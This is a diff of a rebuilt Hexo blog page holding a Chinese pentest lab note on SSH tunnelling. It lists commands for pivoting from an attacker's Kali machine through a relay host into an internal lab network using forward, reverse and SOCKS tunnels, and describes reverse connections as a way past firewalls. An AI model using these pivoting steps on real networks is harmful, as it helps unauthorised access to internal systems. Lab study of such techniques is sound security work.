@@ -1,136 +1,228 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>ssh隧道 | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ssh隧道黑客（ 192.168 .80.128）—-(192.168 .80 .174 )server1(192.168.132.134)—-(192.168.132.132)server2 正向隧道 在中转机上 映射内网ssh -CNfL 0.0.0.0:7777:192.168.132.132:80 &amp;#114;&amp;#x6f;&amp;#111;&amp;#x74;&amp;#64;&amp;#49;&amp;#x32;&amp;#55;&amp;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ssh隧道">
-<meta property="og:url" content="http://example.com/2023/02/21/ssh%E9%9A%A7%E9%81%93/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="ssh隧道黑客（ 192.168 .80.128）—-(192.168 .80 .174 )server1(192.168.132.134)—-(192.168.132.132)server2 正向隧道 在中转机上 映射内网ssh -CNfL 0.0.0.0:7777:192.168.132.132:80 &amp;#114;&amp;#x6f;&amp;#111;&amp;#x74;&amp;#64;&amp;#49;&amp;#x32;&amp;#55;&amp;">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221164618788.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214111025665.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214111139425.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214111628894.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214112704704.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214113907276.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214144605241.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214145309639.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221170644499.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221170802053.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221170733124.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221171102721.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221171139244.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221171257750.png">
-<meta property="og:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230214153153114.png">
-<meta property="article:published_time" content="2023-02-21T14:40:56.000Z">
-<meta property="article:modified_time" content="2023-02-23T06:01:24.240Z">
-<meta property="article:author" content="John Doe">
-<meta property="article:tag" content="代理和隧道">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/img/ssh%E9%9A%A7%E9%81%93/image-20230221164618788.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="July-above">
+    
+    <title>
+        
+            ssh隧道 |
+        
+        July-above
+    </title>
+    
 <link rel="stylesheet" href="/css/style.css">
 
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"header_transparent":false,"background_img":"/images/bg.svg","description":"黄色的森林分出两条路 || 我选择人迹更少的那一条，从此决定我一生的道路。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-ssh隧道" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/02/21/ssh%E9%9A%A7%E9%81%93/" class="article-date">
-  <time datetime="2023-02-21T14:40:56.000Z" itemprop="datePublished">2023-02-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      ssh隧道
-    </h1>
-  
 
-      </header>
+<body>
+<div class="progress-bar-container">
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               July-above
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                主页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">主页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">ssh隧道</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">July-above</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
         
-        <h3 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h3><p>黑客（ 192.168 .80.128）—-(192.168 .80 .174 )server1(192.168.132.134)—-(192.168.132.132)server2</p>
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-21 22:40:56</span>
+        <span class="mobile">2023-02-21 22:40</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-02-23 14:01:24</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93/">代理和隧道</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h3 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h3><p>黑客（ 192.168 .80.128）—-(192.168 .80 .174 )server1(192.168.132.134)—-(192.168.132.132)server2</p>
 <h5 id="正向隧道"><a href="#正向隧道" class="headerlink" title="正向隧道"></a>正向隧道</h5><ol>
-<li>在中转机上 映射内网ssh -CNfL 0.0.0.0:7777:192.168.132.132:80 <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a>   </li>
+<li>在中转机上 映射内网ssh -CNfL 0.0.0.0:7777:192.168.132.132:80 <a class="link"   href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;" >&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;<i class="fas fa-external-link-alt"></i></a>   </li>
 <li>在kali上输入中转机的ip端口登录<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230221164618788.png" alt="image-20230221164618788"></li>
 </ol>
 <h5 id="反向隧道"><a href="#反向隧道" class="headerlink" title="反向隧道"></a>反向隧道</h5><h6 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h6><ol>
-<li><p>把本地的22端口映射到黑客的2222端口   ssh -qTfnN -R 2222:127.0.0.1:22 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x38;&#48;&#x2e;&#49;&#x32;&#56;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x38;&#48;&#x2e;&#49;&#x32;&#56;</a><img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214111025665.png" alt="image-20230214111025665"></p>
+<li><p>把本地的22端口映射到黑客的2222端口   ssh -qTfnN -R 2222:127.0.0.1:22 <a class="link"   href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#56;&#48;&#46;&#x31;&#50;&#x38;" >&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#56;&#48;&#46;&#x31;&#50;&#x38;<i class="fas fa-external-link-alt"></i></a><img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214111025665.png" alt="image-20230214111025665"></p>
 </li>
-<li><p>kali上  ssh -p 2222 <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#49;">&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#49;</a> <img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214111139425.png" alt="image-20230214111139425"></p>
+<li><p>kali上  ssh -p 2222 <a class="link"   href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;" >&#x72;&#x6f;&#111;&#x74;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;<i class="fas fa-external-link-alt"></i></a> <img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214111139425.png" alt="image-20230214111139425"></p>
 </li>
 <li><p>请求内网网站<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214111628894.png" alt="image-20230214111628894"></p>
 </li>
 </ol>
 <h6 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h6><ol>
-<li>在中间机上把内网的80端口映射到kali的2223端口     ssh -qTfnN -R 2223:192.168.132.132:80 <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#56;&#48;&#46;&#x31;&#x32;&#56;">&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#56;&#48;&#46;&#x31;&#x32;&#56;</a></li>
+<li>在中间机上把内网的80端口映射到kali的2223端口     ssh -qTfnN -R 2223:192.168.132.132:80 <a class="link"   href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#x31;&#50;&#x38;" >&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#x31;&#50;&#x38;<i class="fas fa-external-link-alt"></i></a></li>
 <li>直接浏览器访问自己的2223端口<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214112704704.png" alt="image-20230214112704704"></li>
 </ol>
 <h4 id="ssh本地socket代理"><a href="#ssh本地socket代理" class="headerlink" title="ssh本地socket代理"></a>ssh本地socket代理</h4><ol>
-<li>kali上输入： ssh -qTfnN -D 7070 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#56;&#x30;&#46;&#x31;&#x37;&#52;">&#114;&#111;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#56;&#x30;&#46;&#x31;&#x37;&#52;</a></li>
+<li>kali上输入： ssh -qTfnN -D 7070 <a class="link"   href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#56;&#x30;&#x2e;&#x31;&#55;&#x34;" >&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#56;&#x30;&#x2e;&#x31;&#55;&#x34;<i class="fas fa-external-link-alt"></i></a></li>
 <li>在火狐浏览器设置<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214113907276.png" alt="image-20230214113907276"></li>
 <li><img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214144605241.png" alt="image-20230214144605241"></li>
 </ol>
 <h4 id="ssh本地转发"><a href="#ssh本地转发" class="headerlink" title="ssh本地转发"></a>ssh本地转发</h4><ol>
-<li>kali上，把内网主机的80端口转发到中间人的6666端口   ssh -L 127.0.0.1:6663:192.168.132.132:80 <a href="mailto:&#114;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x38;&#48;&#x2e;&#49;&#55;&#x34;">&#114;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x38;&#48;&#x2e;&#49;&#55;&#x34;</a> -fN<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214145309639.png" alt="image-20230214145309639"></li>
+<li>kali上，把内网主机的80端口转发到中间人的6666端口   ssh -L 127.0.0.1:6663:192.168.132.132:80 <a class="link"   href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#x31;&#x37;&#x34;" >&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#x31;&#x37;&#x34;<i class="fas fa-external-link-alt"></i></a> -fN<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214145309639.png" alt="image-20230214145309639"></li>
 </ol>
 <h4 id="ssh远程转发访问"><a href="#ssh远程转发访问" class="headerlink" title="ssh远程转发访问"></a>ssh远程转发访问</h4><p>属于反向连接容易越过防火墙</p>
 <ol>
@@ -142,7 +234,7 @@
 </li>
 </ol>
 </li>
-<li><p>在内网机中添加 ssh -R 8877:192.168.132.132:80  <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#51;&#x32;&#x2e;&#49;&#51;&#52;">&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#51;&#x32;&#x2e;&#49;&#51;&#52;</a>   把自己映射到中间机的外网ip上<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230221170802053.png" alt="image-20230221170802053"></p>
+<li><p>在内网机中添加 ssh -R 8877:192.168.132.132:80  <a class="link"   href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x33;&#x32;&#x2e;&#49;&#51;&#52;" >&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x33;&#x32;&#x2e;&#49;&#51;&#52;<i class="fas fa-external-link-alt"></i></a>   把自己映射到中间机的外网ip上<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230221170802053.png" alt="image-20230221170802053"></p>
 </li>
 <li><p>在kali上直接访问 192.168.80.174：8877端口即可<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230221170733124.png" alt="image-20230221170733124"></p>
 </li>
@@ -155,146 +247,198 @@
 <li>kali:<img src="/img/ssh%E9%9A%A7%E9%81%93/image-20230214153153114.png" alt="image-20230214153153114"></li>
 </ol>
 
-      
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93/">#代理和隧道</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/02/21/netsh/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">netsh</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/02/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">票据传递</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="nav-text">ssh隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E9%9A%A7%E9%81%93"><span class="nav-text">正向隧道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93"><span class="nav-text">反向隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">方法2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E6%9C%AC%E5%9C%B0socket%E4%BB%A3%E7%90%86"><span class="nav-text">ssh本地socket代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="nav-text">ssh本地转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91%E8%AE%BF%E9%97%AE"><span class="nav-text">ssh远程转发访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#openssl%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86"><span class="nav-text">openssl反弹加密</span></a></li></ol></li></ol>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/21/ssh%E9%9A%A7%E9%81%93/" data-id="clegp89j5000p5ouzfomhfjt3" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93/" rel="tag">代理和隧道</a></li></ul>
+</div>
 
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/02/21/netsh/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
+            </div>
         
-          netsh
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/02/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">票据传递</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">redis数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93/" rel="tag">代理和隧道</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/" rel="tag">域安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
     </div>
-  </div>
+</div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">redis数据库</a> <a href="/tags/%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93/" style="font-size: 20px;">代理和隧道</a> <a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/" style="font-size: 15px;">域安全</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a>
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">July-above</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
     </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/02/21/redis%E5%92%8C%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/">redis和密钥登录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/21/frp%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93/">frp内网隧道</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/21/dns%E9%9A%A7%E9%81%93/">dns隧道</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/21/icmp%E9%9A%A7%E9%81%93/">icmp隧道</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/21/neo-regreg/">neo-regreg代理</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2023 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
 </footer>
+
+        </div>
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
 
 
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+    
 
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+</main>
 
 
 
-
-<script src="/js/script.js"></script>
